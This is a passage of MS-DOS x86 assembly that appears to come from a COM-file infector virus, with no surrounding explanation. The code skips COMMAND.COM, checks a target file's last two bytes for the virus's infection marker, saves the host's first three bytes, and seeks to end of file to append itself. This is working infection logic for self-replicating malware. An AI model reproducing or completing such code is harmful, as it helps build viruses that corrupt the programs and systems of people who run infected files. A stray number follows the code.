```
lea     di, [bp + com_com]
lea     si, [bp + dta_file_name]
mov     cx, 11        ; length of 'COMMAND.COM'
repe    cmpsb          ; repeat while equal
jne     check_if_infected
jmp     close_file

check_if_infected:
mov     dx, word ptr [bp + dta_file_size] ; only use first word
          ; since COM file
          ; file size - 2
sub     dx, 2

mov     ax, 4200h
mov     cx, 0         ; cx:dx ptr to offset from
int     21h           ; origin of movers
mov     ah, 3fh       ; read last 2 characters
mov     cx, 2
lea     dx, [bp + last_chars]
int     21h

mov     ah, [bp + last_chars]
cmp     ah, [bp + virus_id]
jne     save_3_bytes
mov     ah, [bp + last_chars + 1]
cmp     ah, [bp + virus_id + 1]
jne     save_3_bytes
jmp     close_file

save_3_bytes:
mov     ax, 4200h     ; 00=start of file
xor     cx, cx
xor     dx, dx

int     21h

mov     ah, 3Fh
mov     cx, 3
lea     dx, [bp + _3_bytes]
int     21h

goto_eof:
mov     ax, 4202h     ; 02=End of file
xor     cx, cx        ; offset from origin of move
xor     dx, dx        ; (i.e. nowhere)
int     21h           ; ax holds file size

; since it is a COM file, overflow will not occur
```

650